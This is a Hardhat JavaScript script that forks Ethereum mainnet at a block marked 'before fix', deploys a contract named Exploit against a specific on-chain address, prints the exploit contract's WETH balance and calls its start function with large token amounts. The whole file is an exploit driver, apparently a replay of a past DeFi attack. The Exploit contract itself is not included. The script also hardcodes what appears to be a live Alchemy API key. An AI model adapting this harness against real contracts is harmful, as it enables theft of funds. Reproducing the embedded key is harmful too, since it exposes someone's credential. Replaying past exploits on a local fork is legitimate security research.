const hre = require("hardhat");

async function main() {
    const API_URL = "https://eth-mainnet.alchemyapi.io/v2/YQ5RumXkSYUSI5ltlhZxHvo15ehKu5P_";
    const { createAlchemyWeb3 } = require("@alch/alchemy-web3");
    const web3 = createAlchemyWeb3(API_URL);

    await hre.network.provider.request({
        method: "hardhat_reset",
        params: [{
          forking: {
            jsonRpcUrl: API_URL
            ,blockNumber: 12350000 // before fix
          }
        }]
    })

    const WETH = await hre.ethers.getContractAt("IERC20",'0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2');

    const Exploit = await hre.ethers.getContractFactory("Exploit");
    const exploit = await Exploit.deploy("0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5");
    console.log("Exploit deployed to:", exploit.address);

    const balance0 = await WETH.balanceOf(exploit.address);
    console.log("Balance before exploit",balance0/1e18,"ETH");

    console.log("starting exploit");

    d = "207569000000000000000000"
    b = "092430000000000000000000"
    await exploit.start(d, b);
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
